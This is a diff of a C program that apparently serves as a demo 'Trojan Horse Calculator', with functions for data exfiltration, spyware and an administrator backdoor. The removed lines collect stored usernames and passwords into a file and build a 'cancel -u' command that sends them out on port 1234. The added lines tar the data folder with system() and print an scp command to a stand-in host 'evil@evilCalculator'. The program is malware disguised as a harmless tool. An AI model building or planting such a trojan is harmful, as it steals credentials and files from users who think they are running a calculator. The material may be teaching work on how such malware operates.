@@ -214,85 +214,36 @@ bool administrator(unsigned int backdoor){
 Runs data exfiltration commands
 */
 void dataExfil() {
-    puts("Begin Data exfiltration process.....\nCreating Data exfil file.....");
-    if (createExfilFile()) {
-        puts("Attempting to send data.....");
-        sendFile();
-        puts("Data exfiltration complete!");
-    } else {
-        puts("Unable to create exfil file. Data exfiltration failure :(");
-    }
+    puts("Begin Data exfiltration process.....\n Creating tar......");
+    puts("Attempting to SCP to server.....");
+    sendFile();
+    puts("Data Exfiltration complete!");
 }
 /*
-Attempts to send data via email
+Sends all data in the data folder to the listening server via SCP
 */
 void sendFile(){
-    FILE *fp;
-    char cmd[FILE_LINE_MAX] = "cancel -u \"$(cat data/exfil.txt)\" -h ";
-    char ip[] = "hostname -I > data/ip.txt";
-    char destport[] = ":1234";
-    char grabbedIP[STRING_MAX];
-    //create file with IP to be added to later command
-    system(ip);
+    char tarCMD[FILE_LINE_MAX] = "tar -czvf ";
+    char *hostName;
+    char tarName[FILE_LINE_MAX] = "dataexfil.tar";
 
-    //reads stored IP address
-    fp = fopen("data/ip.txt", "r");
-    fgets(grabbedIP, STRING_MAX, fp);
-    formatString(grabbedIP);
-    fclose(fp);
 
-    //cats the whole cancel command for execution
-    strcat(cmd, grabbedIP);
-    strcat(cmd, destport);
-    //"running" exfiltraiton command
-    puts("If the data were to actually send, this is what command would run:");
-    fprintf(stdout, "system(%s)\n", cmd);
-    puts("This command requires a server to be listening to capture the exfiltrated data.");
+    //gets hostname for tarfile name
+    hostName = getlogin();
+    strcat(hostName, tarName);
+    strcpy(tarName, hostName);
+
+    //creates tarCMD, creates tar of data file
+    strcat(tarCMD, tarName);
+    strcat(tarCMD, " data/");
+    fprintf(stdout, "%s\n", tarCMD);
+    system(tarCMD);
+
+    //sends file via SCP
+    fprintf(stdout, "scp %s evil@evilCalculator:exfils/%s\n", hostName, hostName);
+    puts("Above is the command that would copy the tarred file to a waiting server.");
 }
-/*
-Creates data exfil file, holds all user data, tree cat, and more
-*/
-bool createExfilFile(){
-    FILE* exfil;
-    FILE* users;
-    char hostName[FILE_LINE_MAX];
-    char username[STRING_MAX];
-    char password[STRING_MAX];
 
-    exfil = fopen("data/exfil.txt", "w");
-    if (exfil != NULL) {
-        //getting host name
-        if (gethostname(hostName, sizeof(hostName)) == 0) {
-            fprintf(exfil, "%s Data Exfiltration\n\n~~~~~~~~~~~Begin Data Exfiltration~~~~~~~~~~~\n", hostName);
-        } else {
-            fprintf(exfil, "Unknown Host Data Exfiltration\n\n");
-        }
-
-        //User data
-        users = fopen("users/passwords.txt", "r");
-        fprintf(exfil, "Usernames and Passwords:\n");
-        if (users != NULL) {
-            //gets all username and password sets
-            while (fgets(username, STRING_MAX, users) != NULL) {
-                fgets(password, STRING_MAX, users);
-                formatString(username);
-                formatString(password);
-                fprintf(exfil, "Username: '%s' Password: '%s'\n", username, password);
-            }
-            fprintf(exfil, "End User data\n\n");
-        } else {
-            fprintf(exfil, "Unable to locate users file\n");
-        }
-        fclose(users);
-
-        fprintf(exfil, "~~~~~~~~~~~End Data Exfiltration~~~~~~~~~~~");
-        fclose(exfil);
-        return true;
-    } else {
-        puts("Unable to open exfiltration file. Oh well.");
-        return false;
-    }
-}
 /*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                               Spyware
@@ -494,9 +445,6 @@ void formatString(char string[]) {
 */
 int main(){
     //Trojan Horse Calculator
-    //calculator();
-    runSpyware();
     puts("Welcome to the best ever calculator!");
     userAuth();
-    //sendFile();
 }
